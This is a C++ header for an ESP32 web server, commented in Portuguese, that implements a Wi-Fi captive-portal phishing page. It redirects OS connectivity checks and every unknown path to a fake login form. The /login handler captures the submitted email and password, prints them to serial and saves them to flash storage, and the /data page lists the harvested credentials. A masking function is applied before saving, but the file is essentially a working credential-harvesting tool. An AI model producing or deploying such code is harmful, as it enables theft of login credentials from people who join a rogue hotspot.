#ifndef SERVER_HANDLERS_H
#define SERVER_HANDLERS_H

#include <Arduino.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include "config.h"
#include "webpages.h"
#include "utils.h"

// Handler para a página principal
void handleRoot(AsyncWebServerRequest *request)
{
    request->send(200, "text/html", loginPage);
}

// Handlers para captive portal
void handleGenerateResource(AsyncWebServerRequest *request)
{
    request->redirect("/");
}

void handleHotspotDetect(AsyncWebServerRequest *request)
{
    request->redirect("/");
}

void handleNotFound(AsyncWebServerRequest *request)
{
    request->redirect("/");
}

// Handler para processar login
void handleLogin(AsyncWebServerRequest *request)
{
    String email = request->getParam("email", true)->value();
    String pass = request->getParam("pass", true)->value();

    String maskedemail = mask(email);
    String maskedPass = mask(pass);

    Serial.printf("Login recebido:\n  Usuário: %s\n  Senha: %s\n", maskedemail.c_str(), maskedPass.c_str());

    saveLogin(maskedemail, maskedPass);
    signalLoginReceived();

    // Envia página de sucesso
    request->send(200, "text/html", successPage);
}

// Handler para exibir dados salvos
void handleData(AsyncWebServerRequest *request)
{
    String response = "<h1>Saved Login Data</h1>";
    response += "<table border=\"1\" cellpadding=\"5\" cellspacing=\"0\">";
    response += "<thead><tr><th>Email</th><th>Senha</th></tr></thead>";
    response += "<tbody>";

    File file = SPIFFS.open("/data.txt");
    if (file && file.size() > 0)
    {
        while (file.available())
        {
            String line = file.readStringUntil('\n');
            line.trim();
            if (line.length() > 0)
            {
                int emailIndex = line.indexOf("Email: ");
                int passIndex = line.indexOf(" | Senha: ");
                if (emailIndex >= 0 && passIndex > emailIndex)
                {
                    String email = line.substring(emailIndex + 7, passIndex);
                    email.trim();
                    String pass = line.substring(passIndex + 10);
                    pass.trim();
                    response += "<tr><td>" + email + "</td><td>" + pass + "</td></tr>";
                }
            }
        }
        file.close();
    }
    else
    {
        response += "<tr><td colspan=\"2\">No data found</td></tr>";
    }

    response += "</tbody></table><br><br>";
    response += "<div style=\"display: flex; gap: 10px;\">";
    response += "<form method=\"GET\" action=\"/data\">";
    response += "<button type=\"submit\">Refresh Data</button>";
    response += "</form>";
    response += "<form method=\"POST\" action=\"/erase\">";
    response += "<button type=\"submit\">Erase Data</button>";
    response += "</form>";
    response += "</div>";

    request->send(200, "text/html", response);
}

// Handler para apagar dados
void handleErase(AsyncWebServerRequest *request)
{
    if (SPIFFS.exists("/data.txt"))
    {
        SPIFFS.remove("/data.txt");
    }
    request->redirect("/data");
}

// Função para configurar todas as rotas do servidor
void setupServerRoutes(AsyncWebServer &server)
{
    // Serve a página de login
    server.on("/", HTTP_GET, handleRoot);

    // Captive portal routes
    server.on("/generate_204", HTTP_GET, handleGenerateResource);
    server.on("/hotspot-detect.html", HTTP_GET, handleHotspotDetect);
    server.onNotFound(handleNotFound);

    // Processa o login postado
    server.on("/login", HTTP_POST, handleLogin);

    // Exibe os dados salvos
    server.on("/data", HTTP_GET, handleData);

    // Apaga o arquivo de dados
    server.on("/erase", HTTP_POST, handleErase);
}

#endif
